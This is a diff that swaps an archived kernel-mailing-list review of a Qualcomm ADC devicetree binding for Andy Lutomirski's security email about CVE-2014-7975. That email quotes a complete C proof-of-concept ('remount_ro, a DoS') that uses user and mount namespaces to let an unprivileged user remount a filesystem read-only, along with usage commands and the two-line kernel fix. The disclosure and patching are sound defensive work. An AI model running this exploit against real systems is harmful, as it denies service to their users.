@@ -1,145 +1,216 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1754556AbaJNF21 (ORCPT <rfc822;w@1wt.eu>);
-	Tue, 14 Oct 2014 01:28:27 -0400
-Received: from ns.mm-sol.com ([37.157.136.199]:35451 "EHLO extserv.mm-sol.com"
-	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-	id S1752444AbaJNF2Y (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
-	Tue, 14 Oct 2014 01:28:24 -0400
-Message-ID: <543CB46F.2040803@mm-sol.com>
-Date: Tue, 14 Oct 2014 08:28:15 +0300
-From: Stanimir Varbanov <svarbanov@mm-sol.com>
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20130330 Thunderbird/17.0.5
+	id S1754611AbaJNFeM (ORCPT <rfc822;w@1wt.eu>);
+	Tue, 14 Oct 2014 01:34:12 -0400
+Received: from mail-la0-f42.google.com ([209.85.215.42]:61027 "EHLO
+	mail-la0-f42.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
+	with ESMTP id S1753208AbaJNFeJ (ORCPT
+	<rfc822;linux-kernel@vger.kernel.org>);
+	Tue, 14 Oct 2014 01:34:09 -0400
 MIME-Version: 1.0
-To: Hartmut Knaack <knaack.h@gmx.de>
-CC: Ian Campbell <ijc+devicetree@hellion.org.uk>,
-        Pawel Moll <pawel.moll@arm.com>, Rob Herring <robh+dt@kernel.org>,
-        Kumar Gala <galak@codeaurora.org>, Mark Rutland <mark.rutland@arm.com>,
-        Grant Likely <grant.likely@linaro.org>,
-        Jonathan Cameron <jic23@kernel.org>, Arnd Bergmann <arnd@arndb.de>,
-        linux-arm-msm@vger.kernel.org, linux-kernel@vger.kernel.org,
-        linux-iio@vger.kernel.org, devicetree@vger.kernel.org,
-        Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
-        Lars-Peter Clausen <lars@metafoo.de>,
-        Angelo Compagnucci <angelo.compagnucci@gmail.com>,
-        Doug Anderson <dianders@chromium.org>,
-        Fugang Duan <B38611@freescale.com>,
-        Johannes Thumshirn <johannes.thumshirn@men.de>,
-        Jean Delvare <jdelvare@suse.de>, Philippe Reynes <tremyfr@yahoo.fr>,
-        Lee Jones <lee.jones@linaro.org>,
-        Josh Cartwright <joshc@codeaurora.org>,
-        Stephen Boyd <sboyd@codeaurora.org>,
-        David Collins <collinsd@codeaurora.org>,
-        "Ivan T. Ivanov" <iivanov@mm-sol.com>
-Subject: Re: [PATCH v3 2/2] DT: iio: vadc: document dt binding
-References: <1411563415-11933-1-git-send-email-svarbanov@mm-sol.com> <1411563415-11933-3-git-send-email-svarbanov@mm-sol.com> <5439B7A8.9030306@gmx.de>
-In-Reply-To: <5439B7A8.9030306@gmx.de>
-Content-Type: text/plain; charset=ISO-8859-15
-Content-Transfer-Encoding: 7bit
+In-Reply-To: <CALCETrVRhm1u6LEFSwtjNj_y=u9SbWoOP9t82C0Yq1zeAmRLpg@mail.gmail.com>
+References: <a1480dcc3c706e309a88884723446f2e84fedd5b.1412796914.git.luto@amacapital.net>
+ <CALCETrVRhm1u6LEFSwtjNj_y=u9SbWoOP9t82C0Yq1zeAmRLpg@mail.gmail.com>
+From: Andy Lutomirski <luto@amacapital.net>
+Date: Mon, 13 Oct 2014 22:33:46 -0700
+Message-ID: <CALCETrWaMircwfJGWY4dyF647dz1VXyknRTond2r7H+NPScgLw@mail.gmail.com>
+Subject: Re: [PATCH] fs: Add a missing permission check to do_umount
+To: Al Viro <viro@zeniv.linux.org.uk>,
+        "Eric W. Biederman" <ebiederm@xmission.com>,
+        "security@kernel.org" <security@kernel.org>,
+        Linus Torvalds <torvalds@linux-foundation.org>
+Cc: Serge Hallyn <serge.hallyn@ubuntu.com>,
+        Andy Lutomirski <luto@amacapital.net>, stable <stable@vger.kernel.org>,
+        "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>,
+        Linux FS Devel <linux-fsdevel@vger.kernel.org>
+Content-Type: text/plain; charset=UTF-8
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-Thanks for the comments!
-
-On 10/12/2014 02:05 AM, Hartmut Knaack wrote:
-> Hi,
-> two small issues inline.
-> Stanimir Varbanov schrieb am 24.09.2014 14:56:
->> Document DT binding for Qualcomm SPMI PMIC voltage ADC
->> driver.
+On Thu, Oct 9, 2014 at 3:36 PM, Andy Lutomirski <luto@amacapital.net> wrote:
+> On Wed, Oct 8, 2014 at 12:37 PM, Andy Lutomirski <luto@amacapital.net> wrote:
+>> Accessing do_remount_sb should require global CAP_SYS_ADMIN, but
+>> only one of the two call sites was appropriately protected.
 >>
->> Signed-off-by: Stanimir Varbanov <svarbanov@mm-sol.com>
->> Signed-off-by: Ivan T. Ivanov <iivanov@mm-sol.com>
+>> Fixes CVE-2014-7975.
+>
+> Due to my ineptitude, the cat is well and truly out of the bag on this
+> one, complete with PoC.
+
+Beuller?
+
+Linus, can you pull this?
+
+The following changes since commit a1480dcc3c706e309a88884723446f2e84fedd5b:
+
+  fs: Add a missing permission check to do_umount (2014-10-08 12:32:47 -0700)
+
+are available in the git repository at:
+
+  git://git.kernel.org/pub/scm/linux/kernel/git/luto/linux.git CVE-2014-7975
+
+for you to fetch changes up to a1480dcc3c706e309a88884723446f2e84fedd5b:
+
+  fs: Add a missing permission check to do_umount (2014-10-08 12:32:47 -0700)
+
+Thanks,
+Andy
+
+>
+> This fix really ought to be safe.  Inside a mountns owned by a
+> non-root user namespace, the namespace root almost always has
+> MNT_LOCKED set (if it doesn't, then there's a bug, because rootfs
+> could be exposed).  In that case, calling umount on "/" will return
+> -EINVAL with or without this patch.
+>
+> Outside a userns, this patch will have no effect.  may_mount, required
+> by umount, already checks
+> ns_capable(current->nsproxy->mnt_ns->user_ns, CAP_SYS_ADMIN), so an
+> additional capable(CAP_SYS_ADMIN) check will have no effect.
+>
+> That leaves anything that calls umount on "/" in a non-root userns
+> while chrooted.  This is the case that is currently broken (it
+> remounts ro, which shouldn't be allowed) and that my patch changes to
+> -EPERM.  If anything relies on *that*, I'd be surprised.
+>
+> --Andy
+>
+>>
+>> Cc: stable@vger.kernel.org
+>> Signed-off-by: Andy Lutomirski <luto@amacapital.net>
 >> ---
->>  .../devicetree/bindings/iio/adc/qcom,spmi-vadc.txt |  130 ++++++++++++++++++++
->>  1 files changed, 130 insertions(+), 0 deletions(-)
->>  create mode 100644 Documentation/devicetree/bindings/iio/adc/qcom,spmi-vadc.txt
 >>
->> diff --git a/Documentation/devicetree/bindings/iio/adc/qcom,spmi-vadc.txt b/Documentation/devicetree/bindings/iio/adc/qcom,spmi-vadc.txt
->> new file mode 100644
->> index 0000000..fa30300
->> --- /dev/null
->> +++ b/Documentation/devicetree/bindings/iio/adc/qcom,spmi-vadc.txt
->> @@ -0,0 +1,130 @@
->> +Qualcomm's SPMI PMIC voltage ADC
->> +
->> +SPMI PMIC voltage ADC (VADC) provides interface to clients to read
->> +voltage. A 15 bit ADC is used for voltage measurements. There are multiple
->> +peripherals to the VADC and the scope of the driver is to provide interface
->> +for the USR peripheral of the VADC.
->> +
->> +VADC node:
->> +
->> +- compatible:
->> +    Usage: required
->> +    Value type: <string>
->> +    Definition: Should contain "qcom,spmi-vadc".
->> +
->> +- reg:
->> +    Usage: required
->> +    Value type: <u32>
->> +    Definition: Base address in the SPMI PMIC register map.
->> +
->> +- address-cells:
->> +    Usage: required
->> +    Value type: <u32>
->> +    Definition: Must be one.
->> +
->> +- size-cells:
->> +    Usage: required
->> +    Value type: <u32>
->> +    Definition: Must be zero.
->> +
->> +- interrupts:
->> +    Usage: optional
->> +    Value type: <prop-encoded-array>
->> +    Definition: End of conversion interrupt number. If this property does
->> +            not exist polling will be used instead.
->> +
->> +- interrupt-names:
->> +    Usage: optional
->> +    Value type: <string>
->> +    Definition: Should contain the interrupt name "eoc" (end of conversion).
->> +
->> +Channel node properties:
->> +
->> +- reg:
->> +    Usage: required
->> +    Value type: <u32>
->> +    Definition: AMUX channel number.
->> +            See include/dt-bindings/iio/qcom,spmi-pmic-vadc.h
->> +
->> +- qcom,decimation:
->> +    Usage: optional
->> +    Value type: <u32>
->> +    Definition: Sampling rate to use for the individual channel measurement.
->> +            Quicker measurements can be made by reducing decimation ratio.
->> +            Valid values are 512, 1024, 2048, 4096.
->> +            If property is not found, default value of 512 will be used.
->> +
->> +- qcom,pre-scaling:
->> +    Usage: optional
->> +    Value type: <u32 array>
->> +    Definition: Used for scaling the channel input signal before the signal is
->> +            fed to VADC. The configuration for this node is to know the
->> +            pre-determined ratio and use it for post scaling. Select one from
->> +            the following options.
->> +            <1 1>, <1 3>, <1 4>, <1 6>, <1 20>, <1 8>, <10 81>, <1 10>
->> +            If property is not found default value depending of chip will be used.
->> +
->> +- qcom,ratiometric:
->> +    Usage: optional
->> +    Value type: <empty>
->> +    Definition: Channel calibration type. If this property is specified
->> +            VADC will use the VDD reference(1.8V) and GND for channel
-> Missing whitespace before opening parenthesis.
->> +            calibration. If property is not found, channel will be
->> +            calibrated with 625mV and 1.25V reference channels.
-> There is a slight majority in using V instead of mv (2 : 1), so why not express everything in V?
+>> *Sigh*
+>>
+>> Build the thing below and do something like:
+>>
+>> $ cd /dev/pts
+>> $ remount_ro /dev
+>>
+>> /* remount_ro.c */
+>> /* Copyright (c) 2014 Andrew Lutomirski.  All rights reserved. */
+>>
+>> #define _GNU_SOURCE
+>> #include <unistd.h>
+>> #include <sched.h>
+>> #include <sys/types.h>
+>> #include <sys/wait.h>
+>> #include <fcntl.h>
+>> #include <stdio.h>
+>> #include <string.h>
+>> #include <err.h>
+>> #include <sys/mount.h>
+>> #include <sys/syscall.h>
+>> #include <sys/stat.h>
+>>
+>> #ifndef CLONE_NEWUSER
+>> #define CLONE_NEWUSER 0x10000000
+>> #endif
+>>
+>> static void set_map(const char *path, uid_t outer)
+>> {
+>>         char buf[1024];
+>>         int fd = open(path, O_WRONLY);
+>>         if (fd == -1)
+>>                 err(1, "open map");
+>>         sprintf(buf, "0 %ld 1", (long)outer);
+>>         if (write(fd, buf, strlen(buf)) != strlen(buf))
+>>                 err(1, "write map");
+>>         close(fd);
+>> }
+>>
+>> int main(int argc, char **argv)
+>> {
+>>   printf("remount_ro, a DoS by Andy Lutomirski\n");
+>>   if (argc != 2) {
+>>     printf("Usage: remount_ro TARGET_MOUNT\n");
+>>     return 1;
+>>   }
+>>
+>>   int origroot_fd;
+>>   long uid = geteuid(), gid = getegid();
+>>   char origcwd[16384];
+>>   const char *target = argv[1];
+>>
+>>   if (unshare(CLONE_NEWUSER) != 0)
+>>     err(1, "unshare(CLONE_NEWUSER)");
+>>   if (unshare(CLONE_NEWNS) != 0)
+>>     err(1, "unshare(CLONE_NEWNS)");
+>>
+>>   set_map("/proc/self/uid_map", uid);
+>>   set_map("/proc/self/gid_map", gid);
+>>
+>>   if (mount("/", "/", NULL, MS_REC | MS_PRIVATE, NULL) != 0)
+>>     err(1, "MS_PRIVATE");
+>>
+>>   // Minimize required thought: just chroot to the target first.
+>>   if (chroot(target) != 0)
+>>     err(1, "chroot to target");
+>>
+>>   // Big song and dance to clear MNT_LOCKED on "/".
+>>
+>>   origroot_fd = open("/", O_RDONLY);
+>>   if (origroot_fd == -1)
+>>     err(1, "open");
+>>
+>>   if (!getcwd(origcwd, sizeof(origcwd)))
+>>       err(1, "getcwd");
+>>   if (!strncmp("(unreachable)", origcwd, 13))
+>>     errx(1, "current directory must be under the target directory");
+>>   if (!strcmp(origcwd, "/"))
+>>     errx(1, "don't run from the target directory");
+>>   if (mount("temporary_root", ".", "tmpfs", 0, NULL) != 0)
+>>     err(1, "mount");
+>>   if (chdir(origcwd) != 0)
+>>     err(1, "chdir");
+>>
+>>   if (syscall(SYS_pivot_root, ".", ".") != 0)
+>>     err(1, "pivot_root");
+>>
+>>   if (fchdir(origroot_fd) != 0)
+>>     err(1, "fchdir");
+>>   close(origroot_fd);
+>>
+>>   if (chroot(".") != 0)
+>>     err(1, "chroot");
+>>
+>>   // That was fun.  Exploit time.
+>>   if (umount2("/", MNT_FORCE) != 0)
+>>     err(1, "umount");
+>>   printf("Seems to have worked.  Have fun.\n");
+>>
+>>   return 0;
+>> }
+>>
+>>  fs/namespace.c | 2 ++
+>>  1 file changed, 2 insertions(+)
+>>
+>> diff --git a/fs/namespace.c b/fs/namespace.c
+>> index ef42d9bee212..7f67b463a5b4 100644
+>> --- a/fs/namespace.c
+>> +++ b/fs/namespace.c
+>> @@ -1356,6 +1356,8 @@ static int do_umount(struct mount *mnt, int flags)
+>>                  * Special case for "unmounting" root ...
+>>                  * we just try to remount it readonly.
+>>                  */
+>> +               if (!capable(CAP_SYS_ADMIN))
+>> +                       return -EPERM;
+>>                 down_write(&sb->s_umount);
+>>                 if (!(sb->s_flags & MS_RDONLY))
+>>                         retval = do_remount_sb(sb, MS_RDONLY, NULL, 0);
+>> --
+>> 1.9.3
+>>
+>
+>
+>
+> --
+> Andy Lutomirski
+> AMA Capital Management, LLC
 
-No worries, will correct.
+
 
 -- 
-regards,
-Stan
+Andy Lutomirski
+AMA Capital Management, LLC
